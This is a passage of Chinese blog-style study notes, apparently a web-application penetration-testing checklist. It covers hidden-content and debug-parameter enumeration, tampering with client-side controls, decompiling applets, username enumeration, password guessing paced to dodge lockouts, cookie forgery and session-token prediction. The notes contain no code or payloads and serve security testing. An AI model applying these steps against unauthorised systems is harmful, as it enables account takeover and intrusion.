<li>先找到应用程序响应无效资源的规律，以便将这个规律用于枚举过程中的筛查；获取规律的办法：先手动向已知有效和已知无效的资源发起请求，比对返回的响应，看看应用程序在响应有效和无效资源时，有什么特征；</li>
<li>准备一份常见文件名、文件扩展名和常见目录的列表；</li>
<li>了解应用程序开发者的命名方案，以便猜测余下的资源名称；例如某个资源命名为 AddDocument 和 ViewDocument，那很可能存在 EditDocument 和 RemoveDocument 等资源；</li>
<li>查看客户端代码，从中发现与服务端内容有关的线索，HTML 注释和禁用的表单元素也需查看；</li>
<li>结合已知的资源名和目录名，再加第2步准备好的列表，向应用程序发送大量请求，根据第1步的特征筛查响应，以找出任何可访问的隐藏内容；</li>
<li>以上一步找到的内容为基础，再次使用爬虫，对它们进行手动和自动两方面的抓取；</li>
</ul>
<h3 id="查找第三方内容"><a href="#查找第三方内容" class="headerlink" title="查找第三方内容"></a>查找第三方内容</h3><ul>
<li>使用 Nikto，探查服务端可能使用的任何第三方组件；注意设置 Nikto 的选项以提供探查的效率，例如使用 --root 选项可在指定目录中进行查找；或者使用 -404 选项指定一个字符串，对应用程序自定义的 Not Fount 页面进行标识；</li>
<li>手动核查结果，以找出其中可能有用的信息，避免出现漏网之鱼；</li>
<li>在 Host 消息头中指定 IP  地址，访问应用程序在服务器上的根目录。查看应用程序是否会返回不一样的响应；如果会的话，针对该 IP 地址进行 Nikto 扫描；</li>
<li>请求根目录时，分别设置不同的 User-Agent 值，看服务端是否会返回不同的内容；</li>
</ul>
<h3 id="枚举标识符函数"><a href="#枚举标识符函数" class="headerlink" title="枚举标识符函数"></a>枚举标识符函数</h3><p>有些应用程序会在请求参数中携带要执行的函数名称，例如：/admin.jsp/action=editUser 或 /main.php?func=A21，很有意思；</p>
<ul>
<li>确定任何在请求参数中提交函数名称的链接；</li>
<li>分析它的命名规律，同时找出猜测失败时的响应特征；</li>
<li>准备一份常用的函数名称列表，发送大量枚举请求；</li>
<li>一般来说，应用程序的内容地图是基于 URL 路径来绘制的，但有时可换个思路，尝试基于函数名称，来编写内容地图；先通过枚举找出所有功能路径，然后为它们建立逻辑关系（详见第4章示例）；</li>
</ul>
<h3 id="调试参数"><a href="#调试参数" class="headerlink" title="调试参数"></a>调试参数</h3><p>有些应用程序会在 URL 中携带调试参数，以开启调试功能；</p>
<ul>
<li>选择一个或多个可能使用调试参数的 URL，一般最有可能出现在登录、搜索、文件上传或下载的功能中；</li>
<li>枚举常见的调试参数名称（如 debug、test、hide、source 等）与常用的参数值（如 true、yes、on、1 等）；枚举所有键值对组合，向应用程序发送大量请求（据说 Burp 有个“集束炸弹”功能可以帮忙生成组合）；</li>
<li>分析响应，看是否与非调试状态的响应有所区别；</li>
</ul>
<h2 id="分析应用程序-1"><a href="#分析应用程序-1" class="headerlink" title="分析应用程序"></a>分析应用程序</h2><h3 id="确定功能"><a href="#确定功能" class="headerlink" title="确定功能"></a>确定功能</h3><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210514075045.png"></p>
<ul>
<li>了解为了让应用程序正常运行，需要建立的核心功能，以及每项功能需要涉及的操作；</li>
<li>了解应用程序使用的核心安全机制，以及这些安全机制的工作原理（重点可放在身份验证、会话管理、访问控制等关键的几个机制，以及它们的辅助功能如用户注册、忘记密码等）；</li>
<li>了解外围功能，如错误消息、管理功能、日志功能、站外链接、重定向的使用位置等；</li>
<li>找出任何与应用程序通用样式不一致的界面、参数命名或导航，将它们挑出来进行深入的测试（这些位置很可能使用第三方的组件）；</li>
</ul>
<h3 id="确定数据进入点"><a href="#确定数据进入点" class="headerlink" title="确定数据进入点"></a>确定数据进入点</h3><ul>
<li>确定应用程序中所有引入用户输入的位置，包括 URL、查询字符串参数、POST 数据、cookie、消息头等；</li>
<li>了解应用程序使用的所有自定义的数据传输或者数据编码方法，例如自定义的查询字符串格式、被提交数据是否使用键值对或者其他表示方法；</li>
<li>了解所有在应用程序中引入的用户可控制的，或者第三方控制的带外通道，例如显示和处理 SMTP 邮件；</li>
</ul>
<h3 id="确定所使用的技术"><a href="#确定所使用的技术" class="headerlink" title="确定所使用的技术"></a>确定所使用的技术</h3><ul>
<li>找出客户端代码所使用的技术，例如表单、JS脚本、cookie、Java Applet、ActiveX 控件、Flash 对象等；</li>
<li>尽可能确定服务端所使用的技术，包括使用何种语言、框架、与数据库和电子邮件交互的组件等；</li>
<li>检查响应中的 Server 消息头，或者其他 HTTP 消息头、HTML 源代码注释中可能出现的标识符，通过标识符判断服务端所使用的服务器软件；有时，应用程序的不同功能可能使用不同的后端组件进行处理，因为可能会找到多种不同的标识符；</li>
<li>使用 Httprint 工具，分析 Web 服务器指纹；</li>
<li>检查上一步内容解析过程收集的信息，找出有助于了解服务端使用何种技术的关键信息，例如文件扩展名、目录、URL 序列等；检查会话令牌和 cookie 名称，并通过 google 搜索这些名称背后所使用的技术；</li>
<li>找出那些看起来有点意思的脚本名称和查询参数，因为它们可能属于第三方组件；使用 inurl 选项通过 google 搜索相关内容，找出同样使用这些第三方组件的其他站点。对这些站点实施非侵入审查，有可能会发现一些在目标应用程序中隐藏的功能和内容；</li>
</ul>
<h3 id="解析受攻击面-1"><a href="#解析受攻击面-1" class="headerlink" title="解析受攻击面"></a>解析受攻击面</h3><ul>
<li>了解和推测服务端的应用程序内部结构和功能，以及为实现某些客户端功能的后台工作机制，例如查询订单的功能，大概率需要跟数据库发生交互；</li>
<li>罗列好功能后，再思考每一种功能背后可能发生的漏洞，例如文件上传功能可能存在路径遍历漏洞、用户间通信可能存在 XSS 漏洞、联系客服功能可能存在 SMTP 注入漏洞等；</li>
<li>制定攻击优先级计划，优先攻击最有用的功能以及与之相关的最严重的潜在漏洞；</li>
</ul>
<h2 id="测试客户端控件"><a href="#测试客户端控件" class="headerlink" title="测试客户端控件"></a>测试客户端控件</h2><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210514082819.png"></p>
<h3 id="客户端数据传送机制"><a href="#客户端数据传送机制" class="headerlink" title="客户端数据传送机制"></a>客户端数据传送机制</h3><ul>
<li>找出所有在客户端传送数据的场景，包括但不限于隐藏的表单字段、cookie、URL 参数等；</li>
<li>根据所传送数据的名称、值和出现的位置，猜测它们在服务端应用程序逻辑中的用途；</li>
<li>尝试修改数据的值，看是否会对服务端的应用程序产生影响，包括了解应用程序是否接受任意值，还是会进行过滤；以及是否会干扰应用程序的逻辑，是否会触发或破坏一些安全机制；</li>
<li>如果客户端传送模糊数据，可尝试破译模糊算法，以便在模糊数据中写入任意指定值；以及可尝试不修改数据，而是在不同场景中提交相同的模糊数据，看是否会干扰应用程序的逻辑；</li>
<li>如何应用程序在客户端使用 ASP.NET ViewState，对其进行测试。看是否可以破坏它，或者查看其中是否包括敏感数据（不同页面，使用 ViewStatue 的方式可能有所不同）<ul>
<li>使用 Burp 套件中的 ViewState 分析器，看 EnableViewStateMac 选项是否开启，如果开启的话，则数据不可修改，因为服务端将校验客户端提交的内容是否与发出时一致，如果修改，会触发错误；</li>
<li>查看解码后的 ViewState，看是否包含敏感数据；</li>
<li>尝试一个被解码的参数值，再重新编码，存入 ViewState；如果服务器接受修改后的 ViewState，则说明 ViewState 可被用于提交任意的输入。因此，可对其包含的数据进行和普通参数一样的测试；</li>
</ul>
</li>
</ul>
<h3 id="客户端输入控件"><a href="#客户端输入控件" class="headerlink" title="客户端输入控件"></a>客户端输入控件</h3><ul>
<li>找出所有客户端对输入进行限制的场景，了解其限制规则；</li>
<li>违法这些规则提交输入，轮流测试每一个参数，看服务端是否使用相同的输入确认；</li>
<li>检查所有的 HTML 表单，找出禁用的元素，如禁用的灰色按钮；并尝试与其他表单一起提交，看应用程序如何处理。如果发生异常行为的，思考是否可以在攻击过程中利用这种异常行为（代理服务器可以通过配置规则，自动启用禁用的字段，提高攻击效率，例如 Burp 套件中的 "HTML修改" 选项）</li>
</ul>
<h3 id="测试浏览器扩展组件"><a href="#测试浏览器扩展组件" class="headerlink" title="测试浏览器扩展组件"></a>测试浏览器扩展组件</h3><h4 id="了解组件功能"><a href="#了解组件功能" class="headerlink" title="了解组件功能"></a>了解组件功能</h4><ul>
<li>通过代理服务器拦截客户端和服务端之间的流量，监控其数据（如果数据被序列化，则可以使用套件的工具对其反序列化）；</li>
<li>有了数据后，查看在客户端中呈现出来的功能，从而了解这些数据被如何使用和呈现，能够为用户带来什么功能价值；必要时，可以重复发送关键请求，或者修改服务端返回的响应，了解功能如何实现；</li>
</ul>
<h4 id="反编译组件"><a href="#反编译组件" class="headerlink" title="反编译组件"></a>反编译组件</h4><p>有些应用程序会使用一些厚客户端组件，例如 Java 的 applet</p>
<ul>
<li>通过拦截代理服务器查找特定的文件类型，另外还可以在 HTML 源代码中进行查找，例如 applet 标签等；<ul>
<li>.class 或 .jar 文件：使用 Java</li>
<li>.swf 文件：Flash</li>
<li>.xap 文件：Silverlight</li>
</ul>
</li>
<li>找出所有调用 applet 的地方，并确定 applet 返回的数据，是否被提交到服务端；applet 返回的数据有时可能会经过模糊处理，此时不能直接修改它，因为直接修改会被服务端发现和拒绝，导致数据无效；需要先反编译 applet，得到其源代码，之后才能对数据进行修改；</li>
<li>在浏览器输入 URL，下载 applet 字节码，使用适当的工具对其进行反编译（有时下载的文件可能被压缩过，可使用解压工具进行解压，例如 WinRAR 或 WinZip）；<ul>
<li>Java 的 applet：可使用 Jad</li>
<li>Flash：SWFScan、Flasm、Flare；</li>
<li>Silverlight：.NET Reflector；</li>
</ul>
</li>
<li>分析反编译后的源代码，了解其返回的数据是如何处理和计算出来的；</li>
<li>查看源代码中，是否包含对任意数据进行模糊处理的通用函数；</li>
<li>如果源代码中有对输入进行检查，可对其进行修改，让检查失效；</li>
<li>修改后，再使用编译工具，将源代码重新编译为原本的格式；</li>
</ul>
<h4 id="附加调试器-1"><a href="#附加调试器-1" class="headerlink" title="附加调试器"></a>附加调试器</h4><p>如果客户端程序很大，反编译、阅读和修改其源代码的工作量很大，而且也很容易出错，一个抄小路的办法是使用调试器，追踪某个功能的执行过程，理解其处理逻辑，然后在合适的位置设置断点，修改相应的值，得到我们想要的最终预期结果即可。</p>
<ul>
<li>JavaSnoop；</li>
<li>Silverlight Spy；</li>
</ul>
<h4 id="测试-ActiveX-控件"><a href="#测试-ActiveX-控件" class="headerlink" title="测试 ActiveX 控件"></a>测试 ActiveX 控件</h4><ul>
<li>找出所有使用 ActiveX 控件的地方。可从拦截的请求记录中查找 .cab 文件名，或者在 HTML 页面源代码中搜索 OBJECT 标签</li>
<li>同样可以使用调试器来修改和操纵 ActiveX 控件的返回值；</li>
<li>可使用 COMRaider 等工具枚举控件的各种方法。根据 ActiveX 控件的方法名称和参数，猜测其用途。检查是否能够操作这些方法，从而影响控件的行为，例如避开执行的输入确认机制；</li>
<li>如果控件的功能是收集检查客户端计算机的相关信息，则可以使用第三方工具（如 Filemon、Regmon 等）监控控件收集到的信息；然后通过修改客户端注册表中的值，或者创建相应的数据项，来影响控件的行为；</li>
<li>探查控件是否存在可用来攻击其他用户的漏洞；可修改 HTML 调用控件的源代码，修改参数，监控控件的处理结果；</li>
<li>查找控件有无存在危险的方法，例如搜索 LaunchExe 名称；</li>
<li>使用 COMRaider 对控件进行模糊测试，看是否存在缓冲区溢出漏洞；</li>
</ul>
<h2 id="测试验证机制"><a href="#测试验证机制" class="headerlink" title="测试验证机制"></a>测试验证机制</h2><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210515083421.png"></p>
<h3 id="了解验证机制"><a href="#了解验证机制" class="headerlink" title="了解验证机制"></a>了解验证机制</h3><ul>
<li>了解应用程序使用的验证机制，如用户名密码表单、证书、多重验证；</li>
<li>了解所有与验证相关的功能，如登录、注册、忘记密码等；</li>
<li>如果应用程序不能自助注册，则尝试通过其他方法搞到几个账户；</li>
</ul>
<h3 id="测试密码强度"><a href="#测试密码强度" class="headerlink" title="测试密码强度"></a>测试密码强度</h3><ul>
<li>寻找应用程序中关于密码强度的最低要求；</li>
<li>在注册页面或密码修改页面，使用不同强度的密码，对实际的密码强度规则进行测试，例如短密码、纯数字密码、全小写或全大写密码、单词型密码、和用户名一致的密码等；</li>
<li>测试服务端密码验证机制：例如先设置一个足够长（如12个字符）且复杂的密码（包含大小写、数字和特殊符号），然后尝试使用这个密码的各种变化形式进行登录（例如删除最后一个字符、改变大小写、删除特殊字符等）；如果某种尝试取得成功，不要停下来，继续测，直到摸清服务端的整个密码验证机制；</li>
<li>了解清楚最低密码强度要求，以及服务端的密码验证机制后，使用这些信息来枚举可能有效的密码值，以提高攻击成功概率；</li>
<li>尝试枚举可能存在的内置账户，它们很可能并不满足最低密码强度要求；</li>
</ul>
<h3 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h3><ul>
<li>找出所有提交用户名的位置，例如可见字段、隐藏字段、cookie 等；（这些位置通常为登录、注册、修改密码、退出账户、激活账户等）；</li>
<li>在每一个提交用户名的位置，故意先提交一个有效用户名的请求，然后再提交一个无效用户名的请求，比如这两个请求之间的差异，以便后续用于筛查枚举出的有效用户名（这些差异可能发生在可见的 HTML 内容、状态码、不可见的 HTML 源代码中，有时则可从服务端的响应时间做出判断）；可以使用一些第三方工具（如  WebScarab）对返回的 HTML 内容进行自动比对，快速找出差异）；</li>
<li>当找到差异后，再提交一组或多组有效+无效的用户名进行重复测试，然后从差异中寻找规律；</li>
<li>尝试通过应用程序其他方面的漏洞（例如信息泄露、日志、注册用户列表、源代码注释等），获取尽可能多的有效用户名；</li>
<li>分析是否有可能利用一些使用用户名参数的功能，对有效用户名进行枚举，例如注册功能，当尝试输入一个已经存在的用户名时，会有提示；</li>
</ul>
<h3 id="失败次数上限"><a href="#失败次数上限" class="headerlink" title="失败次数上限"></a>失败次数上限</h3><ul>
<li>找出所有提交密码的位置（通常为注册页面、修改密码页面）；如果修改密码页面能够提交任意用户名，则该功能有可能用于猜测密码；</li>
<li>在每一个位置，先提交多组正确的用户名（受控账户）+ 错误密码的请求，监控应用程序的响应，找出响应之间的差异（如果经过10次登录失败后，账户还没有锁定，则可以再提交一个包含有效密码的请求，看是否能够顺利登录，如果可以的话，说明应用程序很可能并没有设置失败次数上限的账户锁定机制）；</li>
<li>如果没有受控账户，则只能通过枚举或猜测一个有效的用户名，然后使用这个用户名进行测试，看超过一定的失败次数后，是否会导致账户锁定（这个方法的缺点是会导致一些用户的账户被冻结锁定）</li>
</ul>
<h3 id="测试忘记密码功能"><a href="#测试忘记密码功能" class="headerlink" title="测试忘记密码功能"></a>测试忘记密码功能</h3><ul>
<li>确定应用程序是否有忘记密码的功能（正常都有）；</li>
<li>使用一个正常的受控账户，完整整个忘记密码的流程，了解其工作机制（有些是发邮件，有些是询问问题、有些是发短信等）；</li>
<li>如果机制是询问答题，则确定这些问题是否由用户在注册时设定或选择的；如果是的话，可使用多个受控账户来收集这些问题，看里面是否有部分问题的答案较容易枚举猜测出来；</li>
<li>如果机制是密码暗示，使用跟上一步相同的步骤，收集密码暗示，看是否有容易猜到答案的暗示；</li>
<li>使用一个受控账户 + 多个错误答案进行测试，看是否会触发账户冻结；如果不会，则意味着可以使用枚举攻击；</li>
<li>如果机制是发送邮件，则使用受控账户接收多个邮件，分析邮件中收到的账户恢复 URL 是否存在规律，能否利用它猜测出发给其他用户的 URL；同时，确认是否有可能控制收件地址；</li>
</ul>
<h3 id="测试“记住我”功能"><a href="#测试“记住我”功能" class="headerlink" title="测试“记住我”功能"></a>测试“记住我”功能</h3><ul>
<li>确定应用程序是否有“记住我”的功能，如果有的话，激活它，并分析它的工作原理；</li>
<li>有些“记住我”的功能可让用户再次登录时不需要输入密码，分析其工作原理；</li>
<li>检查该功能是否使用本地存储的 cookie，如果有的话，分析 cookie 是否包含用户的身份信息；</li>
<li>通常 cookie 会经过模糊处理，但可以通过多个非常相似的用户名，来分析模糊处理是否存在规律，如果有的话，就有机会进行逆向工程；</li>
<li>根据找到的规律，尝试修改 cookie 内容，看是否能够伪装成其他用户登录；</li>
</ul>
<h3 id="测试伪装功能"><a href="#测试伪装功能" class="headerlink" title="测试伪装功能"></a>测试伪装功能</h3><ul>
<li>查找应用程序中是否存在伪装漏洞，即 A 用户可伪装成 B 用户并查看其数据；</li>
<li>从用户提交的数据中，查找是否有哪项数据可用于伪装身份，尝试修改这个数据，看能否伪装成其他用户，尤其是能够提升权限的管理员账户；</li>
<li>在实施密码猜测攻击的过程中，特别留意是否以下现象，即一个账户对应多个密码，或者多个密码对应相同账户；这个现象意味着开发人员很可能设置有后门密码，运营人员利用该后门密码可登录任意用户的账号；</li>
</ul>
<h3 id="测试用户名唯一性"><a href="#测试用户名唯一性" class="headerlink" title="测试用户名唯一性"></a>测试用户名唯一性</h3><ul>
<li>如果应用程序提交自助注册的功能，并允许用户填写自己想要的用户名，则可以尝试使用不同的密码注册相同用户名，看应用程序是否会报错，如果会的话，有可能可以利用该报错功能，来枚举有效的用户名；</li>
<li>注册相同用户名时，如果应用程序没有报错，就有意思了。此时可将 A 账号的密码，修改成与 B 账号一样，然后进行登录，观察应用程序的反应；之后，再尝试使用相同的账号和密码进行注册，观察应用程序的反应；（有些应用程序，可能使用账号+密码的组合，作为用户身份的标识）；</li>
<li>如果两个账号的用户名和密码发生冲突时，应用程序会报错，则可以利用该功能来猜测其他用户的密码；先枚举有效的用户名，再枚举密码进行注册。当某个组合出现报错时，则说明该用户名 + 密码可能已经被注册过了；</li>
<li>如果两个冲突的账号+密码也不会报错，则进行登录，看两个账号的身份是否会互窜，使得 A 账号可以访问 B 账号的数据；</li>
</ul>
<h3 id="测试密码可预测性"><a href="#测试密码可预测性" class="headerlink" title="测试密码可预测性"></a>测试密码可预测性</h3><ul>
<li>如果用户名和密码是由应用程序自动生成的，则找出名称上相连的账号和它们的密码，观察这些密码之间存在规律；</li>
<li>如果用户名的生成是有规律的，则往后推，枚举一组很可能有效的用户名，使用这些用户名来猜测密码；</li>
<li>如果密码的生成是有规律的，则可以使用该规律往前推，枚举可能有效的密码，然后和已经收集的有效用户名进行组合，实施猜测攻击；</li>
</ul>
<h3 id="检测不安全的密码传输"><a href="#检测不安全的密码传输" class="headerlink" title="检测不安全的密码传输"></a>检测不安全的密码传输</h3><ul>
<li>遍历所有需要传输密码的位置，例如注册、登录、密码修改、查看和更新个人信息等功能；</li>
<li>配置代理服务器的拦截功能，对特殊字符进行标记，以便让拦截器找出在哪些位置传输密码；</li>
<li>如果在 URL 参数中传输，则密码很可能会在浏览器历史记录、屏幕、服务器日志，以及 Referer 消息头（当访问第三方链接时）中泄露；</li>
<li>如果密码保存在 cookie 中，则可通过 XSS 攻击或本地隐私攻击获得；</li>
<li>如果密码从服务端传送回客户端，则攻击者有可能通过会话管理漏洞、访问控制漏洞、XSS 漏洞等方式获得证书；</li>
<li>如果密码在传输过程中没有加密，则可能被传输过程中的窃听者获取；</li>
<li>如果使用 HTTPS 传输，但是使用 HTTP 加载表单，则存在中间人攻击漏洞，攻击者可以利用该漏洞获得密码；</li>
</ul>
<h3 id="检测不安全的密码分配"><a href="#检测不安全的密码分配" class="headerlink" title="检测不安全的密码分配"></a>检测不安全的密码分配</h3><ul>
<li>有些应用程序可能使用某种第三方渠道来创建账号或分配初始密码，例如通过发送电子邮件，或者寄送信件等；</li>
<li>如果应用程序使用 URL 来激活账号，则可以尝试连续注册几个账号，然后分析收到的 URL，看是否存在生成规律；</li>
<li>如果有规律，尝试预测应用程序最近生成的 URL，尝试使用这些 URL 来激活最近注册的用户账号；</li>
<li>尝试重复访问激活 URL，看应用程序如何反应；如果会被拒绝，则在重复访问 URL 之前，先冻结账号，然后看这个 URL 能否使用；</li>
<li>尝试看能否通过激活 URL 为账号设置新密码；</li>
</ul>
<h3 id="测试不安全的密码散列"><a href="#测试不安全的密码散列" class="headerlink" title="测试不安全的密码散列"></a>测试不安全的密码散列</h3><ul>
<li>如果获取到了大量的散列密码，通常这些密码共用某个散列值。此时，可尝试使用最常见的密码进行登录，如果可以登录成功，那么跟散列密码中出现频次最高的密码，很可能可以对应得上；</li>
<li>使用离线的第三方散列算法工具（例如彩虹表）破解明文值;</li>
</ul>
<h3 id="测试逻辑缺陷"><a href="#测试逻辑缺陷" class="headerlink" title="测试逻辑缺陷"></a>测试逻辑缺陷</h3><h4 id="测试故障开放条件"><a href="#测试故障开放条件" class="headerlink" title="测试故障开放条件"></a>测试故障开放条件</h4><ul>
<li>罗列出所有应用程序要求客户端提交用户凭据的功能（例如登录、修改密码等）；</li>
<li>使用受控账户访问以上功能，记录所有请求参数；</li>
<li>重复访问这些功能，但是轮流对参数进行修改，以测试应用程序的代码逻辑，这些修改包括：<ul>
<li>提交空字符串；</li>
<li>删除键值对；</li>
<li>提交非常长的值；</li>
<li>提交非常短的值；</li>
<li>字符串代替数字；</li>
<li>数字代替字符串；</li>
<li>以相同的值，多次提交同一个命名参数；</li>
<li>以不同的值，多次提交同一个命名参数；</li>
</ul>
</li>
<li>仔细检查服务端返回的响应，如果发现异常，进一步测试；</li>
<li>基于异常，添加其他异常参数组合，进一步测试和扩大逻辑缺陷；</li>
</ul>
<h4 id="测试多阶段处理机制"><a href="#测试多阶段处理机制" class="headerlink" title="测试多阶段处理机制"></a>测试多阶段处理机制</h4><ul>
<li>如果应用程序的验证功能涉及多个请求，并在不同的请求中提交凭证，则尝试确定每个请求，并记录每个请求所使用的参数；</li>
<li>重复访问这些功能，修改提交请求的顺序，测试应用程序的处理逻辑，测试方法包括：<ul>
<li>以不同的顺序完成所有阶段，到达目标阶段；</li>
<li>轮流直接进入每一个阶段，然后正常完成后续的阶段；</li>
<li>重复访问功能，轮流省略其他的每一个阶段，然后正常访问后续的阶段；</li>
<li>根据响应结果，进一步有针对性的修改访问顺序，测试和扩大应用程序潜在的逻辑缺陷；</li>
</ul>
</li>
<li>查看是否有某些信息，在各个阶段都重复提交（有可能是由用户主动提交，也有可能是隐藏在表单、cookie、或预设的 URL 查询字符串中）；尝试在不同的阶提交不同的值（有效的，无效的），观察应用程序的响应，看提交的参数是否是多余的，或者在某个阶段确认后，后续应用程序就自动信任它，还是在不同的阶段都会检查；尝试利用多阶段漏洞获得未授权的访问，或者降低多阶段机制所要达到的预期控制目标；</li>
<li>仔细查看客户端发送的请求中的所有参数，有可能应用程序使用这些参数跟踪状态，尝试这些参数，破坏应用程序的逻辑；</li>
<li>有些应用程序会在每个阶段中添加一个随机质询，如有，则可对其进行测试：<ul>
<li>如果质询参数跟用户的其他参数一起提交，则尝试能否改质询的键值，选择自己的质询；</li>
<li>使用相同的用户名，重复访问同一个阶段，但质询是否会不断变化，如果会的话，可以重复访问这个阶段，直到出现自己想要的质询；</li>
</ul>
</li>
</ul>
<h3 id="枚举密码"><a href="#枚举密码" class="headerlink" title="枚举密码"></a>枚举密码</h3><ul>
<li>分析所有在应用程序中找到的漏洞，从中筛选出可利用来实现预期目标的漏洞，例如实现用另外一名用户的身份进行登录；如有可能，最好能实现以管理员的身份进行登录；</li>
<li>在实施攻击之前，应该将应用程序的防御机制纳入考虑，提交攻击效率；例如在枚举用户名时，不要选择随机密码，而是使用最常用的密码，这样有一定概率会命中密码，不至于每个枚举的用户名，全部使用掉一次错误机会。使用广度优先，而不是尝试优先的方法来枚举，并且依次使用最常用的密码，避免同一个账户短时间内太多失败请求，导致账户被冻结；</li>
<li>猜测密码时，应该将密码强度规则和长度规则纳入考虑，提前筛查掉不满足强度要求或长度规则的密码；</li>
<li>使用自动化工具来提交枚举攻击效率；</li>
</ul>
<h2 id="测试会话管理机制"><a href="#测试会话管理机制" class="headerlink" title="测试会话管理机制"></a>测试会话管理机制</h2><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210519085415.png"></p>
<h3 id="了解会话管理机制"><a href="#了解会话管理机制" class="headerlink" title="了解会话管理机制"></a>了解会话管理机制</h3><ul>
<li>了解应用程序是如何管理会话状态的。例如是否在每次的请求中使用令牌来标记用户的身份；有些应用程序可能没有使用令牌，而是使用一个加密或模糊处理过的表单来保存用户状态信息（相当于将状态保存在客户端，服务端是无状态的），或者使用 HTTP Authentication 技术来维持状态（它的原理很简单，就是浏览器将用户名和密码等信息保存下来，如果某个 URI 需要验证，浏览器就自动发出凭据，用户无感知）；</li>
<li>如果应用程序使用令牌的话，因为令牌可有多种渠道传送，例如 cookie、查询字符串、隐藏表单、消息体等；因此，可对它们逐个进行排查，看到底是哪个；有时候可能多个渠道同时使用，但实际上不同渠道的值，由不同的后端组件处理。有些看起来很像是令牌的数据，其实并没有用，例如负载均衡亲和性功能所提供的令牌；</li>
<li>找一个必须依赖令牌的页面，例如显示用户个人令牌的页面，然后依次删除请求疑似令牌的参数，看返回的响应是否正常；当出现异常时，即可确认该参数应该是会话令牌；</li>
<li>有些应用程序并没有使用令牌中的完整令牌，而只使用了部分令牌，因此，在找到令牌后，可轮流修改一个字节的值，然后发送请求，看应用程序能否正常返回响应；如果有部分值并未用于确认用户身份，则可以忽略它们；</li>
</ul>
<h3 id="测试令牌的含义"><a href="#测试令牌的含义" class="headerlink" title="测试令牌的含义"></a>测试令牌的含义</h3><ul>
<li>收集令牌：在不同的时间，以不同的账号，登录应用程序，收集应用程序发布的令牌；如果应用程序能够自助注册，则用多个名称相近的账号注册（名称只有一个字符的差别，相同长度不同字符，或者相同字符不同长度）；如果注册时还需要提供额外的身份信息，例如电子邮件，则该信息说不定也会参与到令牌的生成中，因此，也可以对该字段进行系统修改（每两个邮件之间只相关一个字符）；</li>
<li>分析收集到的所有令牌，观察其中是否包含与用户名或者其他用户身份相关数据（如电子邮件）有关的内容；</li>
<li>观察令牌是否使用某种明显的编码或者模糊方案；<ul>
<li>观察用户名长度与令牌长度是否有关，如果相关，则说明很可能使用了模糊处理或某种编码机制；</li>
<li>如果用户名包含相同的字符，则观察令牌中是否包含使用 XOR 异或运算结果的相应序列；</li>
<li>观察令牌是否仅包含十六进制序列，如果是，则说明可能经过了十六进制的编码处理；</li>
<li>观察令牌是否包含等号，以及仅包含 base64 字符集；</li>
</ul>
</li>
<li>如果从令牌中可以观察到规律，则测试是否可以利用这些规律发动攻击，例如利用规律猜测用户程序发给最近用户登录的令牌，然后尝试利用该令牌登录某个依赖令牌的页面，看能否成功；</li>
</ul>
<h3 id="测试令牌的可预测性"><a href="#测试令牌的可预测性" class="headerlink" title="测试令牌的可预测性"></a>测试令牌的可预测性</h3><ul>
<li>快速重复访问某个可返回新令牌的请求，以大量获取连续生成的会话令牌；</li>
<li>观察这些令牌样本，尝试从中寻找规律；此时可使用工具如 Burp Sequencer 来对令牌的随机性进行统计测试；一些注意事项如下：<ul>
<li>令牌中可能部分数据不参与用户身份确认，因此可以忽略它们，只关注那些参与身份验证的内容；</li>
<li>如果看不贴出来令牌数据的类型，则可以尝试多种编码方案（例如 Bases64 ）对其进行解码，看能否转化成更有意义的数据（有时可考虑多种编码方案的组合）；</li>
<li>分析解码后的令牌是否存在规律，计算每两个连续值之间的差；有可能令牌表面看起来没有规律，但是从差值入手，就可以发现规律；这种差值规范可用于提高蛮力攻击的效率；</li>
<li>等待几分钟后，再使用前面的方法重新获取一遍令牌，以观察令牌的生成是否跟时间因素有关；</li>
</ul>
</li>
<li>如果已经找出了一定的规律，再使用一个不同的 IP 地址获取另外一组令牌样本，检查规律是否仍然存在（排查令牌的生成与 IP  地址有关）；以及看能否使用第一组令牌，推导出第二组令牌；</li>
<li>如果已经找到规律和时间依赖关系，则检查是否可以利用该规律，猜测最近发布的新令牌，尝试使用新令牌登录；</li>
<li>另外可以使用 Burp Intruder 工具，对令牌中的每个位进行翻转修改，看是否会造成令牌失效，或者变成另外一名用户的身份；</li>
</ul>
<h3 id="检查不安全的令牌传输"><a href="#检查不安全的令牌传输" class="headerlink" title="检查不安全的令牌传输"></a>检查不安全的令牌传输</h3><ul>
<li>以正常方式依次访问应用程序，从主页开始，到登录，到访问其他所有功能。记录所有发布令牌的位置，并留意哪些部分使用 HTTP 通信，哪些使用 HTTPS 通信（可通过拦截器的日志观察到这些信息）；</li>
<li>如果应用程序使用 cookie 字段传送信息，则观察 cookie 值，看是否启用了 httpOnly 和 Secure 选项；</li>
<li>如果令牌是通过 HTTP 传送的话，则令牌很容易被拦截；</li>
<li>如果应用程序未登录前使用 HTTP，在登录后使用 HTTPS，则留意登录后是否发布了新令牌，如果没有发布新令牌，仍然使用旧令牌，则旧令牌在 HTTP 阶段就已经可以被拦截了；</li>
<li>如果进入了 HTTPS 访问的页面后，页面上存在 HTTP 链接，则可以尝试访问它们，观察此时提交的令牌是否仍然有效，还是会被服务端终止；</li>
</ul>
<h3 id="检查日志中泄露的令牌"><a href="#检查日志中泄露的令牌" class="headerlink" title="检查日志中泄露的令牌"></a>检查日志中泄露的令牌</h3><ul>
<li>如果在解析应用程序过程中，发现应用程序有日志、管理、监控等功能，那么留意这些功能是否泄露会话令牌；检查访问这些功能的权限。如果只有管理员能够访问，低权限用户访问不到，则看有没有其他漏洞可加以利用，来协助访问这些功能；</li>
<li>有时候，某些特殊的原因，会导致开发者会在 URL 中传送令牌；此时如果用户访问站外链接，会导致在 Referer 消息头中泄露令牌；因此，特别留意是否有某个页面，可以被任意其他用户查看访问，同时用户可以在该页面插入任意的站外链接，例如个人自我介绍页面；</li>
<li>如果能够收集到大量的其他用户令牌，则对它们进行排查，看里面是否有某个令牌刚好属于管理员；</li>
</ul>
<h3 id="测试令牌会话映射"><a href="#测试令牌会话映射" class="headerlink" title="测试令牌会话映射"></a>测试令牌会话映射</h3><ul>
<li>用同一个账号，在不同的浏览器或不同的电脑登录应用程序，看登录后的两个会话是否同时有效，如果是的话，说明应用程序支持并行会话。这将使得攻击者即使使用其他用户的身份登录，也不会被检测出来；</li>
